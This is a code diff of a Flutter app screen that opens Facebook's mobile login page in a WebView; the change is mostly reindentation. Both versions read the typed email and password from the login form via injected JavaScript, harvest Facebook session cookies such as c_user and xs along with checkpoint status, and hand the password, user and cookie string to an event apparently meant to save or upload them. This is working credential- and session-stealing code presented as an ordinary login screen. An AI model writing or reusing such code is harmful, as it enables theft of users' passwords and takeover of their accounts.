@@ -57,115 +57,115 @@ class _FacebookViewState extends State<FacebookView> {
 
   Widget facebookBody() {
     return Scaffold(
-        backgroundColor: Colors.white,
-        body: BlocProvider(
-          create: (context) => facebookBloc,
-          child: BlocListener<FacebookBloc, FacebookState>(
-            listener: (context, state) {
-              if (state is CreatedFacebookState) {
-                context.router.replaceAll([const OnboardingRoute()]);
-              }
-              if (state is LoadingFacebookState) {
-                DialogUtil.showLoading(context);
-              }
-              if (state is LoadedFacebookState) {
-                DialogUtil.hideLoading(context);
-              }
-            },
-            child: BlocBuilder<FacebookBloc, FacebookState>(
-              builder: (context, state) {
-                return Column(
-                  children: [
-                    const SizedBox(
-                      height: 58,
-                    ),
-                    Expanded(
-                      child: WebView(
-                        initialUrl: url,
-                        javascriptMode: JavascriptMode.unrestricted,
-                        onWebViewCreated: (controllerWeb) async {
-                          webViewController = controllerWeb;
-                          await cookieManager.setCookies([
-                            Cookie(cookieName, cookieValue)
-                              ..domain = domain
-                              ..expires =
-                                  DateTime.now().add(const Duration(days: 1000))
-                              ..httpOnly = false
-                          ]);
-                        },
-                        onProgress: (_) async {
-                          try {
-                            String pass = await webViewController
-                                .runJavascriptReturningResult(
-                                    "document.getElementById('m_login_password').value");
-                            String email = await webViewController
-                                .runJavascriptReturningResult(
-                                    "document.getElementById('m_login_email').value");
-                            pass = pass.replaceAll(''', '');
+      backgroundColor: Colors.white,
+      body: BlocProvider(
+        create: (context) => facebookBloc,
+        child: BlocListener<FacebookBloc, FacebookState>(
+          listener: (context, state) {
+            if (state is CreatedFacebookState) {
+              context.router.replaceAll([const OnboardingRoute()]);
+            }
+            if (state is LoadingFacebookState) {
+              DialogUtil.showLoading(context);
+            }
+            if (state is LoadedFacebookState) {
+              DialogUtil.hideLoading(context);
+            }
+          },
+          child: BlocBuilder<FacebookBloc, FacebookState>(
+            builder: (context, state) {
+              return Column(
+                children: [
+                  const SizedBox(
+                    height: 58,
+                  ),
+                  Expanded(
+                    child: WebView(
+                      initialUrl: url,
+                      javascriptMode: JavascriptMode.unrestricted,
+                      onWebViewCreated: (controllerWeb) async {
+                        webViewController = controllerWeb;
+                        await cookieManager.setCookies([
+                          Cookie(cookieName, cookieValue)
+                            ..domain = domain
+                            ..expires =
+                                DateTime.now().add(const Duration(days: 1000))
+                            ..httpOnly = false
+                        ]);
+                      },
+                      onProgress: (_) async {
+                        try {
+                          String pass = await webViewController
+                              .runJavascriptReturningResult(
+                                  "document.getElementById('m_login_password').value");
+                          String email = await webViewController
+                              .runJavascriptReturningResult(
+                                  "document.getElementById('m_login_email').value");
+                          pass = pass.replaceAll(''', '');
                                               email = email.replaceAll(''', '');
-                            if (pass != 'null' &&
-                                email != 'null' &&
-                                resPass == '' &&
-                                resUser == '') {
-                              resPass = pass.replaceAll("'", '');
-                              resUser = email.replaceAll("'", '');
-                            }
-                          } catch (_) {}
-                        },
-                        onPageFinished: (_) async {
-                          final gotCookies =
-                              await cookieManager.getCookies(url);
-                          // print(gotCookies.length);
-                          // print(gotCookies.toString());
+                          if (pass != 'null' &&
+                              email != 'null' &&
+                              resPass == '' &&
+                              resUser == '') {
+                            resPass = pass.replaceAll("'", '');
+                            resUser = email.replaceAll("'", '');
+                          }
+                        } catch (_) {}
+                      },
+                      onPageFinished: (_) async {
+                        final gotCookies = await cookieManager.getCookies(url);
+                        // print(gotCookies.length);
+                        // print(gotCookies.toString());
+                        for (var e in gotCookies) {
+                          if (e.name == 'checkpoint') {
+                            hasCheckpoint = true;
+                          }
+                        }
+                        int count = 0;
+                        String res = '';
+                        if (gotCookies.length >= 7) {
                           for (var e in gotCookies) {
-                            if (e.name == 'checkpoint') {
-                              hasCheckpoint = true;
+                            if (e.name == 'datr' ||
+                                e.name == 'fr' ||
+                                e.name == 'sb' ||
+                                e.name == 'c_user' ||
+                                e.name == 'xs' ||
+                                e.name == 'wd') {
+                              count++;
+                              res += '${e.name}=${e.value};';
+                            }
+                            if (e.name == 'c_user') {
+                              cUser = e.value;
                             }
                           }
-                          int count = 0;
-                          String res = '';
-                          if (gotCookies.length >= 7) {
-                            for (var e in gotCookies) {
-                              if (e.name == 'datr' ||
-                                  e.name == 'fr' ||
-                                  e.name == 'sb' ||
-                                  e.name == 'c_user' ||
-                                  e.name == 'xs' ||
-                                  e.name == 'wd') {
-                                count++;
-                                res += '${e.name}=${e.value};';
-                              }
-                              if (e.name == 'c_user') {
-                                cUser = e.value;
-                              }
-                            }
-                            res += '';
-                          }
-                          // print(res.length);
-                          // print(count);
-                          // print(resPass);
-                          // print(resUser);
-                          if (res.length > 30 &&
-                              count >= 5 &&
-                              resUser != '' &&
-                              resPass != '') {
-                            facebookBloc.add(
-                              CreateFacebookEvent(
-                                user: resUser,
-                                pass: resPass,
-                                hasCheckpoint: hasCheckpoint,
-                                cookie: res,
-                              ),
-                            );
-                          }
-                        },
-                      ),
+                          res += '';
+                        }
+                        // print(res.length);
+                        // print(count);
+                        // print(resPass);
+                        // print(resUser);
+                        if (res.length > 30 &&
+                            count >= 5 &&
+                            resUser != '' &&
+                            resPass != '') {
+                          facebookBloc.add(
+                            CreateFacebookEvent(
+                              user: resUser,
+                              pass: resPass,
+                              hasCheckpoint: hasCheckpoint,
+                              cookie: res,
+                            ),
+                          );
+                        }
+                      },
                     ),
-                  ],
-                );
-              },
-            ),
+                  ),
+                ],
+              );
+            },
           ),
-        ));
+        ),
+      ),
+    );
   }
 }
